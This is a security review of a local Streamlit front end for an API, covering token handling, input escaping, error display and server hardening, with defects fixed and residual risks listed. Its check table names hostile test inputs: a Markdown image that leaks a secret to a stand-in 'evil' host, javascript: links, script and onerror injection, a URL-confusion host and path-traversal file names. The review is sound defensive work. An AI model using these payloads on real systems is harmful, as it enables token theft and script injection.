# Security review — P4 (Streamlit interface)

Model: V1 = one local user. The interface is an HTTP client of the API (option A, `TECHNICAL_DESIGN.md` §5).
Status: **reviewed per step, residual risks listed — NOT a claim that the interface is secure.** This file grows with each step.

## Step 1 — foundation (config, API client, escaping, navigation) — 2026-09-21

### 1. What was verified

| Area | Check | Result |
|------|-------|--------|
| Where the token goes | `API_URL` accepts `http` only towards `127.0.0.1` / `localhost` / `::1`; `https` elsewhere. Refused: remote `http`, `http://127.0.0.1@evil.example` (real host = what follows the `@`), `localhost.evil.example`, credentials in the URL, no scheme, `ftp:`, `file:`, `javascript:`, empty | OK (24 cases) |
| Least privilege (code) | The UI reads **only** `API_URL` and `API_TOKEN`, through `dotenv_values` — nothing is put in `os.environ`; `.env.ui` (only those two) wins over `.env`; the real environment wins over both | OK (tests) |
| Token handling | `repr(settings)` hides the token; the token appears in no error message; a redirect is never followed (would carry the token to another host); `HTTP(S)_PROXY` variables are ignored (`trust_env=False`) | OK (tests) |
| Errors shown to the user | Only the API's own fixed `detail` (truncated to 300 chars), or our messages. HTML pages, binary bodies, JSON without `detail`, lists: replaced by a generic text — the body is never shown. 401 → configuration hint. API down / timeout → clear message | OK (tests) |
| Request safety | Ids must be canonical UUIDs before entering a URL (`../health`, `..%2f`, upper-case, `x?y=1` refused, nothing sent); a hostile `Content-Disposition` file name (`../../evil.exe`, `.csv.exe`, spaces, 200 chars) is replaced by `export.csv` | OK (tests) |
| Contract | The client works against the **real** FastAPI application, in memory: upload, read, list, correct, export, erase; 401, 413, 415, 422, 429 (with retry delay) arrive as readable messages | OK (integration tests) |
| Markdown / HTML injection | `safe()` escapes every syntax character (`![x](http://evil/?d=secret)`, `[click](javascript:...)`, `<script>`, `<img onerror>`, tables, quotes, lists, entities); a hostile error message reaches `st.error` escaped; a test fails if `unsafe_allow_html` appears anywhere in `src/ui` | OK (tests) |
| Streamlit hardening | `config.toml`: `address=127.0.0.1`, `maxUploadSize=10`, `gatherUsageStats=false`, `showErrorDetails="none"`, XSRF + CORS on. **Real server**: answers on `127.0.0.1`, refuses connections on both other network addresses of the machine (`192.168.x.x`), prints no "Network URL" | OK |
| Navigation | The four pages render; an unreachable API or a configuration error shows a message and a "Réessayer" button and stops the page (no crash) | OK (AppTest) |
| Static / deps | `ruff`, `bandit` 0 findings, `pip-audit` no known vulnerability, 489 tests, 98 % coverage; `data/` untouched by the suite | OK |

### 2. Defects found and fixed

1. **Importing `src.api.app` created the application and read the real `.env`** (`app = create_app()` at module level): every key (Gemini, encryption, token) was loaded into any process that merely imported the module — the test runner included. Found because a new test ("the UI must not carry the other keys") failed only in the full run. Fixed: no module-level `app`; the API is started with `uvicorn --factory src.api.app:create_app` (`make api` updated); regression test imports `src.api.app`, `src.ui.app` and `src.ui.api_client` in a fresh process and checks that the secrets did not appear.
2. A test of mine asserted `API_TOKEN` in a message that is (correctly) shown as `API\_TOKEN` after escaping; assertion fixed.
3. The client passed a `timeout` option to every request, which the test client warns about; it is now sent only when it differs from the default.

### 3. Residual risks

| # | Risk | Severity | Note |
|---|------|----------|------|
| 1 | **Same-user file access**: with a single `.env` the file stays readable by the Streamlit process' OS user; "least privilege" holds for the code path, not at operating-system level | Low (local) | A separate `.env.ui` with only `API_URL` and `API_TOKEN` gives real isolation (supported, gitignored) |
| 2 | The token lives in the Streamlit process memory (shared client, `st.cache_resource`) | Low | Server side only; never sent to the browser. Single user |
| 3 | `safe()` protects text shown with Markdown; text put in **widget values** (text inputs, tables) is shown literally by Streamlit, but this was not checked in a real browser | Low | Check when the screens exist (steps 2-5) |
| 4 | Streamlit telemetry is disabled by configuration; the absence of outgoing connections was not observed at network level | Low | Config is the documented switch |
| 5 | The `unsafe_allow_html` check is a text search: it does not catch other ways to inject HTML (e.g. custom components) | Low | No custom components are used |
| 6 | Not tested in a real browser (rendering, XSRF cookie, upload limit at the browser) | Medium | Planned with the screenshots at the end of P4 |
| 7 | `st.file_uploader` keeps uploaded bytes in memory until the session ends | Low | Limited to 10 MB per file by `maxUploadSize` |

### 4. Next steps
Upload page (progress, per-file errors, free-tier notice), Result page (editable form, delete with confirmation), History, Export (download warning). Each step re-runs the checks above and adds its own.
